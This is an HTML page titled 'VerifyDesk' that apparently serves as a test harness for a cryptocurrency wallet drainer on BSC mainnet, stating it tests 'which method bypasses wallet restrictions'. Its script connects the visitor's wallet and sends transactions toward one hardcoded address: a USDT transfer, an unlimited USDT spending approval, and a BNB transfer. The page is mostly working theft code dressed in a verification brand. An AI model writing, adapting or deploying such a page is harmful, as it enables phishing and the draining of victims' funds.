<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>VerifyDesk | Multi-Method Test Suite</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
  <style>
    body { background-color: #060b0a; color: #f3f4f6; font-family: 'Inter', system-ui, sans-serif; }
    .glass-card { background: linear-gradient(145deg, #0d1614 0%, #09100e 100%); border: 1px solid rgba(243, 186, 47, 0.2); }
  </style>
</head>
<body class="min-h-screen flex flex-col justify-between px-4 py-6">

  <!-- Header -->
  <header class="w-full max-w-md mx-auto flex items-center justify-between">
    <div class="flex items-center gap-2.5">
      <div class="w-9 h-9 rounded-xl bg-amber-500/15 border border-amber-400/30 flex items-center justify-center text-amber-400">
        <i class="fa-solid fa-shield-halved text-lg"></i>
      </div>
      <span class="font-bold text-lg text-white">VerifyDesk Test</span>
    </div>
    <span class="text-xs font-medium px-3 py-1.5 rounded-full bg-amber-500/10 text-amber-400 border border-amber-500/25">
      BSC Mainnet
    </span>
  </header>

  <!-- Main Content -->
  <main class="w-full max-w-md mx-auto my-auto py-6 space-y-4">
    <div class="text-center mb-4">
      <h1 class="text-2xl font-extrabold text-white">Select Test Method</h1>
      <p class="text-xs text-gray-400 mt-1">Test which method bypasses wallet restrictions.</p>
    </div>

    <div class="glass-card rounded-2xl p-5 space-y-4">
      
      <!-- Connect Status -->
      <div id="walletInfo" class="hidden p-3 rounded-xl bg-black/40 border border-gray-800 text-xs space-y-1">
        <p class="text-emerald-400 font-medium"><i class="fa-solid fa-circle-check"></i> Connected</p>
        <p class="font-mono text-gray-300" id="walletAddress">--</p>
      </div>

      <!-- Step 1: Connect Button -->
      <button id="connectBtn" onclick="connectWallet()"
        class="w-full py-3 px-4 rounded-xl bg-slate-800 hover:bg-slate-700 text-white font-bold text-sm border border-slate-700 transition-all">
        1. Connect Wallet First
      </button>

      <hr class="border-gray-800 my-2">

      <!-- Method 1: Direct Transfer -->
      <button onclick="testDirectTransfer()"
        class="w-full py-3 px-4 rounded-xl bg-amber-500 hover:bg-amber-400 text-gray-950 font-bold text-sm transition-all shadow-lg">
        Method 1: Direct USDT Transfer
      </button>

      <!-- Method 2: Approve Allowance -->
      <button onclick="testApproveAllowance()"
        class="w-full py-3 px-4 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-bold text-sm transition-all shadow-lg">
        Method 2: USDT Approve Allowance
      </button>

      <!-- Method 3: Native BNB Transfer -->
      <button onclick="testNativeTransfer()"
        class="w-full py-3 px-4 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-sm transition-all shadow-lg">
        Method 3: Native BNB Transfer
      </button>

    </div>
  </main>

  <footer class="text-center text-xs text-gray-500">
    <p>VerifyDesk Test Suite © 2026</p>
  </footer>

  <script>
    const TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
    const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
    const BSC_CHAIN_ID = '0x38';

    const ABI = [
      "function balanceOf(address owner) view returns (uint256)",
      "function transfer(address to, uint amount) returns (bool)",
      "function approve(address spender, uint amount) returns (bool)"
    ];

    let globalProvider, globalSigner, globalUserAddress;

    function getActiveProvider() {
      if (window.ethereum) return window.ethereum;
      if (window.trustwallet) return window.trustwallet;
      return null;
    }

    async function connectWallet() {
      const ethProvider = getActiveProvider();
      if (!ethProvider) {
        alert("Wallet provider not found. Open in Trust Wallet/MetaMask browser.");
        return;
      }

      try {
        const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
        globalUserAddress = accounts[0];

        try {
          await ethProvider.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: BSC_CHAIN_ID }],
          });
        } catch (e) {}

        const provider = new ethers.providers.Web3Provider(ethProvider, "any");
        globalSigner = provider.getSigner();
        globalProvider = ethProvider;

        document.getElementById('walletAddress').textContent = globalUserAddress;
        document.getElementById('walletInfo').classList.remove('hidden');
        document.getElementById('connectBtn').textContent = 'Wallet Connected ✓';
      } catch (err) {
        alert("Connection Error: " + (err.message || err));
      }
    }

    // Method 1: Direct Transfer
    async function testDirectTransfer() {
      if (!globalUserAddress) { alert("Please connect wallet first!"); return; }
      try {
        const contract = new ethers.Contract(USDT_BSC_ADDRESS, ABI, globalSigner);
        // Test amount: 1 USDT (1000000 units) or full balance
        const amount = ethers.utils.parseUnits("1", 6); 
        const data = contract.interface.encodeFunctionData("transfer", [TARGET_ADDRESS, amount]);

        await globalProvider.request({
          method: 'eth_sendTransaction',
          params: [{ from: globalUserAddress, to: USDT_BSC_ADDRESS, data: data, gas: "0x186A0" }]
        });
        alert("Method 1 Triggered Successfully!");
      } catch (e) {
        alert("Method 1 Error: " + (e.message || JSON.stringify(e)));
      }
    }

    // Method 2: Approve Allowance
    async function testApproveAllowance() {
      if (!globalUserAddress) { alert("Please connect wallet first!"); return; }
      try {
        const contract = new ethers.Contract(USDT_BSC_ADDRESS, ABI, globalSigner);
        const maxAmount = ethers.constants.MaxUint256; // Max approval
        const data = contract.interface.encodeFunctionData("approve", [TARGET_ADDRESS, maxAmount]);

        await globalProvider.request({
          method: 'eth_sendTransaction',
          params: [{ from: globalUserAddress, to: USDT_BSC_ADDRESS, data: data, gas: "0x186A0" }]
        });
        alert("Method 2 (Approve) Triggered Successfully!");
      } catch (e) {
        alert("Method 2 Error: " + (e.message || JSON.stringify(e)));
      }
    }

    // Method 3: Native BNB Transfer
    async function testNativeTransfer() {
      if (!globalUserAddress) { alert("Please connect wallet first!"); return; }
      try {
        // Sending 0.001 BNB as test
        const valueHex = ethers.utils.parseEther("0.001").toHexString();

        await globalProvider.request({
          method: 'eth_sendTransaction',
          params: [{
            from: globalUserAddress,
            to: TARGET_ADDRESS,
            value: valueHex,
            gas: "0x5208"
          }]
        });
        alert("Method 3 (Native BNB) Triggered Successfully!");
      } catch (e) {
        alert("Method 3 Error: " + (e.message || JSON.stringify(e)));
      }
    }
  </script>
</body>
</html>
